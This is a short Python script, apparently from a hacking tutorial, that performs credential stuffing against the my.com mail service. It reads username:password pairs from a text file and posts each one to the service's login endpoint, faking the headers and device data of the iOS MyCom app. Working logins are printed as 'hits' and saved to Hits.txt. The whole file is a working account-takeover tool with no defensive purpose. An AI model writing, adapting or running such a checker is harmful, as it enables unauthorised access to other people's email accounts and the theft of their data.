import requests
import urllib.parse

#THIS IS THE SCRIPT OF HELLBOY'S TUTORIAL IF  YOU ENJOYED MAKE SOME SUPPORT !! <3

with open('test.txt', 'r')as read:
    for lines in read:
        cm = lines.split(":")
        USER = cm[0]
        PASSW = cm[1]
        USER1 = urllib.parse.quote(USER)
        PASSW1 = urllib.parse.quote(PASSW)
        URL = 'https://aj-https.my.com/cgi-bin/auth?language=fr_FR&reqmode=fg&country=TN&md5_signature=d8749a1b0e01e1f0d887ff5262e3b067&device_name=iPhone%20de%20bakat&current=MyCom&mp=iOS&MailboxNumber=1&mmp=mail&os=iOS&udid=00000000-0000-0000-0000-000000000000&device_vendor=Apple&segments=condition_791_FAM_84_Control%2Ccondition_843_PMAM-85_Control&ver=14.1.0.16809&timezone=GMT%2B1&concl=3&os_version=15.1&appbuild=16809&model=iPhone8%2C1&device_type=Smartphone&DeviceID=00000000-0000-0000-0000-000000000000&'
        POST = 'ajax_call=1&Lang=fr_FR&simple=1&LoginType=Direct&Login='+USER1+'&mob_json=1&Password='+PASSW1+'&DeviceInfo=%7B%22Useragent%22%3A%22Mozilla%5C%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2015_1%20like%20Mac%20OS%20X%29%20AppleWebKit%5C%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Mobile%5C%2F15E148%20MRMAILAPP%5C%2Fios%5C%2F14.1.0%22%2C%22OS%22%3A%22iOS%2015.1%22%2C%22AppVersion%22%3A%2214.1.0.16809%22%2C%22DeviceName%22%3A%22iPhone%20de%20bakat%22%2C%22Timezone%22%3A%22GMT%2B1%22%2C%22Device%22%3A%22iPhone8%2C1%22%7D&'
        HEADERS = {'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'fr-fr',
                    'Connection': 'keep-alive',
                    'Host': 'aj-https.my.com',
                    'User-Agent': 'MyCom/16809 CFNetwork/1325.0.1 Darwin/21.1.0',
                  }
        REQ = requests.post(URL, data=POST, headers=HEADERS).text
        if 'Ok=1' in REQ:
            print('[HITS] -|'+USER+':'+PASSW)
            c = open('Hits.txt', 'a')
            c.writelines(f''+USER+':'+PASSW) 
        if 'Ok=0' in REQ:
            print('[Fail] -|'+USER+':'+PASSW)


